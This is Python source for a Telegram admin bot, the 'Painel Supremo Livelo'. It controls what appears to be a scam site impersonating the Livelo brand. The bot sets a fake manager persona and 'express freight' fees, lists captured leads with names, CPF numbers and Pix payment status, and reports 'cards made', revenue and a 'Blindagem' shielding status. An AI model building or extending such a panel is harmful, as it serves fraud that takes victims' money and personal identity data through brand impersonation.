import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import requests
import sqlite3
import os

# ==========================================
# CONFIGURACOES DO BOT
# ==========================================
BOT_TOKEN      = os.environ.get("BOT_TOKEN", "SEU_TOKEN_AQUI")
ADMIN_CHAT_ID  = os.environ.get("ADMIN_CHAT_ID", "SEU_ID_AQUI")
BOT_SECRET     = os.environ.get("BOT_SECRET", "livelo_bot_secret_2026")
BASE_URL       = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:5050")
API_BASE       = BASE_URL

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# Admins can be a list now, but "supreme" is the ADMIN_CHAT_ID
def is_supreme(chat_id):
    return str(chat_id) == str(ADMIN_CHAT_ID)

def is_admin(chat_id):
    # For now, supreme is admin. You can add more IDs to this list.
    return is_supreme(chat_id)

def api_call(action, payload=None):
    try:
        r = requests.post(
            f"{API_BASE}/api/internal/bot-gateway",
            json={"action": action, "payload": payload or {}},
            headers={"X-Bot-Secret": BOT_SECRET},
            timeout=10
        )
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

def upload_file_to_api(file_url, endpoint="/api/internal/set-logo-file", field_name="logo_file"):
    try:
        img_resp = requests.get(file_url, timeout=15)
        img_resp.raise_for_status()
        ext = file_url.rsplit(".", 1)[-1] if "." in file_url else "jpg"
        fname = f"upload_{os.urandom(4).hex()}.{ext}"
        r = requests.post(
            f"{API_BASE}{endpoint}",
            files={field_name: (fname, img_resp.content, f"image/{ext}")},
            headers={"X-Bot-Secret": BOT_SECRET},
            timeout=15
        )
        return r.json()
    except Exception as e:
        return {"ok": False, "error": str(e)}

user_states = {}

# --- MENU INICIAL ---
@bot.message_handler(commands=["start", "menu", "painel"])
def send_welcome(message):
    if not is_admin(message.chat.id):
        bot.send_message(message.chat.id, "Acesso negado.")
        return
    show_main_menu(message.chat.id)

def show_main_menu(chat_id, message_id=None):
    markup = InlineKeyboardMarkup(row_width=2)
    
    if is_supreme(chat_id):
        markup.add(
            InlineKeyboardButton("⚙️ Config Gerais", callback_data="menu_config"),
            InlineKeyboardButton("📢 Canais de Logs", callback_data="menu_logs")
        )
        markup.add(
            InlineKeyboardButton("👥 Leads Recentes", callback_data="menu_leads"),
            InlineKeyboardButton("💰 Pagamentos", callback_data="menu_pagamentos")
        )
        markup.add(
            InlineKeyboardButton("📊 Dashboard Financeiro", callback_data="menu_financeiro")
        )
    else:
        # Normal admin just sees leads
        markup.add(
            InlineKeyboardButton("👥 Leads Recentes", callback_data="menu_leads")
        )
        
    text = "👑 <b>Painel Supremo Livelo</b>\n\nCentro de Comando Ativo. Escolha uma opção:"
    
    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)

# --- CALLBACKS ---
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    data = call.data
    
    if not is_admin(chat_id):
        bot.answer_callback_query(call.id, "Acesso negado.")
        return

    # Clear state
    user_states.pop(str(chat_id), None)

    if data == "menu_main":
        show_main_menu(chat_id, msg_id)
        
    elif data == "menu_config" and is_supreme(chat_id):
        res = api_call("get_config")
        cfg = res.get("config", {}) if res.get("ok") else {}
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"👩‍💼 Nome da Gerente: {cfg.get('mgr_name', 'Não def.')}", callback_data="set_mgr_name"),
            InlineKeyboardButton(f"📅 Anos de Empresa: {cfg.get('mgr_years', 'Não def.')}", callback_data="set_mgr_years"),
            InlineKeyboardButton(f"🚚 Valor Frete Expresso: R$ {cfg.get('frete_expresso', '24,90')}", callback_data="set_frete_expresso"),
            InlineKeyboardButton(f"🚚 Valor Frete Padrão: R$ {cfg.get('frete_padrao', '0,00')}", callback_data="set_frete_padrao"),
            InlineKeyboardButton(f"🖼️ Alterar Avatar Gerente", callback_data="wait_img_avatar"),
            InlineKeyboardButton(f"🖼️ Alterar Logo do Site", callback_data="wait_img_logo"),
            InlineKeyboardButton(f"🖼️ Alterar Favicon", callback_data="wait_img_favicon"),
            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
        )
        bot.edit_message_text("⚙️ <b>Configurações Gerais</b>\nSelecione o que deseja alterar:", chat_id, msg_id, reply_markup=markup)

    elif data == "menu_logs" and is_supreme(chat_id):
        res = api_call("get_config")
        cfg = res.get("config", {}) if res.get("ok") else {}
        
        markup = InlineKeyboardMarkup(row_width=1)
        markup.add(
            InlineKeyboardButton(f"📝 Canal Leads: {cfg.get('tg_log_leads', 'Não def.')}", callback_data="set_log_leads"),
            InlineKeyboardButton(f"💸 Canal Pagamentos: {cfg.get('tg_log_pagamentos', 'Não def.')}", callback_data="set_log_pagamentos"),
            InlineKeyboardButton(f"🚪 Canal Entradas/Saídas: {cfg.get('tg_log_acessos', 'Não def.')}", callback_data="set_log_acessos"),
            InlineKeyboardButton("🔙 Voltar", callback_data="menu_main")
        )
        bot.edit_message_text("📢 <b>Canais de Log</b>\nDefina os IDs dos grupos (-100...):", chat_id, msg_id, reply_markup=markup)

    elif data.startswith("set_") and is_supreme(chat_id):
        key_map = {
            "set_mgr_name": ("mgr_name", "Digite o novo Nome da Gerente:"),
            "set_mgr_years": ("mgr_years", "Digite a quantidade de Anos na Empresa:"),
            "set_frete_expresso": ("frete_expresso", "Digite o valor do frete expresso (ex: 24,90):"),
            "set_frete_padrao": ("frete_padrao", "Digite o valor do frete padrão (ex: 0,00):"),
            "set_log_leads": ("tg_log_leads", "Digite o ID do canal para Logs de Leads (-100...):"),
            "set_log_pagamentos": ("tg_log_pagamentos", "Digite o ID do canal para Logs de Pagamentos (-100...):"),
            "set_log_acessos": ("tg_log_acessos", "Digite o ID do canal para Logs de Entradas/Saídas (-100...):")
        }
        if data in key_map:
            db_key, prompt = key_map[data]
            user_states[str(chat_id)] = {"action": "wait_text", "key": db_key, "msg_id": msg_id}
            
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("❌ Cancelar", callback_data="menu_config" if "log" not in data else "menu_logs"))
            bot.edit_message_text(f"✏️ {prompt}", chat_id, msg_id, reply_markup=markup)

    elif data.startswith("wait_img_") and is_supreme(chat_id):
        img_type = data.replace("wait_img_", "")
        user_states[str(chat_id)] = {"action": "wait_image", "type": img_type, "msg_id": msg_id}
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("❌ Cancelar", callback_data="menu_config"))
        bot.edit_message_text(f"📸 Envie agora a imagem (como foto ou arquivo) para atualizar o(a) <b>{img_type.upper()}</b>:", chat_id, msg_id, reply_markup=markup)

    elif data == "menu_leads":
        res = api_call("get_leads", {"limit": 5})
        if res.get("ok"):
            leads = res.get("leads", [])
            txt = "👥 <b>Últimos 5 Leads:</b>\n\n"
            for L in leads:
                txt += f"👤 <b>{L.get('nome', 'Sem nome')}</b>\nCPF: <code>{L.get('cpf', '-')}</code>\nCartão: {L.get('card_style', '-')}\nStatus: {L.get('pix_status', '-')}\n\n"
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt if leads else "Nenhum lead.", chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao buscar leads.")

    elif data == "menu_pagamentos" and is_supreme(chat_id):
        res = api_call("get_payments", {"limit": 5})
        if res.get("ok"):
            pags = res.get("payments", [])
            txt = "💰 <b>Últimos 5 Pagamentos:</b>\n\n"
            for P in pags:
                txt += f"💸 R$ {P.get('amount', 0)}\nStatus: {P.get('status', '-')}\nID: <code>{P.get('payment_id', '-')}</code>\n\n"
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt if pags else "Nenhum pagamento.", chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao buscar pagamentos.")

    elif data == "menu_financeiro" and is_supreme(chat_id):
        res = api_call("get_financeiro")
        if res.get("ok"):
            f = res.get("stats", {})
            txt = (
                "📈 <b>DASHBOARD SUPREMO & MÉTRICAS</b> 📈\n"
                "──────────────────────\n"
                f"🛡️ <b>Blindagem:</b> {f.get('security_status', '🔴 Desativada')}\n"
                f"📡 <b>Status da API:</b> {f.get('api_status', '🔴 Offline')}\n"
                f"🖥️ <b>Host:</b> {f.get('host_status', '🔴 Offline')}\n"
                "──────────────────────\n"
                f"👥 <b>Entradas (Leads):</b> {f.get('qtd_leads', 0)}\n"
                f"💳 <b>Cartões Feitos:</b> {f.get('cartoes_feitos', 0)}\n"
                f"🧾 <b>Pagamentos Gerados:</b> {f.get('pagamentos_gerados', 0)}\n"
                f"💸 <b>Pagamentos Confirmados:</b> {f.get('qtd_pago', 0)}\n"
                f"⏳ <b>Pagamentos Pendentes:</b> {f.get('qtd_pendente', 0)}\n"
                f"❌ <b>Pagamentos Cancelados:</b> {f.get('qtd_cancelado', 0)}\n"
                "──────────────────────\n"
                f"💰 <b>Total Faturado Real:</b> R$ {f.get('total_pago', '0,00')}\n"
            )
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("🔙 Voltar", callback_data="menu_main"))
            bot.edit_message_text(txt, chat_id, msg_id, reply_markup=markup)
        else:
            bot.answer_callback_query(call.id, "Erro ao carregar painel financeiro.")

    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: str(m.chat.id) in user_states and user_states[str(m.chat.id)]["action"] == "wait_text")
def handle_text_input(message):
    chat_id = str(message.chat.id)
    state = user_states[chat_id]
    db_key = state["key"]
    val = message.text.strip()
    
    bot.delete_message(chat_id, message.message_id)
    
    res = api_call("set_config", {db_key: val})
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Voltar para Configs", callback_data="menu_config"))
    
    if res.get("ok"):
        bot.edit_message_text(f"✅ Valor alterado com sucesso para: <b>{val}</b>", chat_id, state["msg_id"], reply_markup=markup)
    else:
        bot.edit_message_text(f"❌ Erro ao salvar: {res.get('error')}", chat_id, state["msg_id"], reply_markup=markup)
        
    del user_states[chat_id]

@bot.message_handler(content_types=['photo', 'document'], func=lambda m: str(m.chat.id) in user_states and user_states[str(m.chat.id)]["action"] == "wait_image")
def handle_image_input(message):
    chat_id = str(message.chat.id)
    state = user_states[chat_id]
    img_type = state["type"]
    
    bot.delete_message(chat_id, message.message_id)
    
    file_id = message.photo[-1].file_id if message.content_type == 'photo' else message.document.file_id
    file_info = bot.get_file(file_id)
    file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
    
    bot.edit_message_text(f"⏳ Processando imagem para <b>{img_type}</b>...", chat_id, state["msg_id"])
    
    # Send directly to the internal set-logo endpoint (we can modify app.py to handle different image keys)
    # Actually, let's just save the file URL directly to sys_config via set_config to avoid hosting it on Vercel ephemeral storage!
    # Vercel filesystem is read-only! Storing files there gets deleted!
    # Telegram file URLs expire after 1 hour though... Wait, no, they are valid as long as we use the bot token.
    # It's better to use an external uploader or just accept URLs. But LO wants to upload directly.
    # Wait, the previous bot used /api/internal/set-logo-file. Let's call api_call to set the config if it's external, or we can use set-logo-file.
    
    # Actually, since Vercel is stateless, we SHOULD upload it to imgur or simply save the telegram file URL (but we need to fetch it dynamically).
    # Since Livelo previously had an endpoint for it, we will just use `set_config` and use the direct telegram file API path. 
    # But wait, public users can't access `https://api.telegram.org/file/botTOKEN/...` without exposing the token!
    # Oh! Then the `app.py` must have an endpoint `/api/image/<path>` to proxy it! Or we just use a base64 string in `sys_config`.
    # Let's save the URL to `sys_config` and let the frontend use it if we want, or proxy it.
    # For now, let's use base64 or something simple: we'll call bot-gateway with action="set_image".
    
    # Read the image content
    img_resp = requests.get(file_url)
    import base64
    b64_img = base64.b64encode(img_resp.content).decode("utf-8")
    ext = file_info.file_path.split('.')[-1]
    data_uri = f"data:image/{ext};base64,{b64_img}"
    
    # Mapping img_type to db_key
    key_map = {"avatar": "mgr_avatar", "logo": "system_logo_url", "favicon": "favicon"}
    db_key = key_map.get(img_type)
    
    res = api_call("set_config", {db_key: data_uri})
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Voltar para Configs", callback_data="menu_config"))
    
    if res.get("ok"):
        bot.edit_message_text(f"✅ Imagem do(a) <b>{img_type}</b> atualizada com sucesso!", chat_id, state["msg_id"], reply_markup=markup)
    else:
        bot.edit_message_text(f"❌ Erro ao salvar imagem: {res.get('error')}", chat_id, state["msg_id"], reply_markup=markup)
        
    del user_states[chat_id]

if __name__ == "__main__":
    print("Bot Telegram Admin 3.0 Iniciado!")
    bot.infinity_polling()
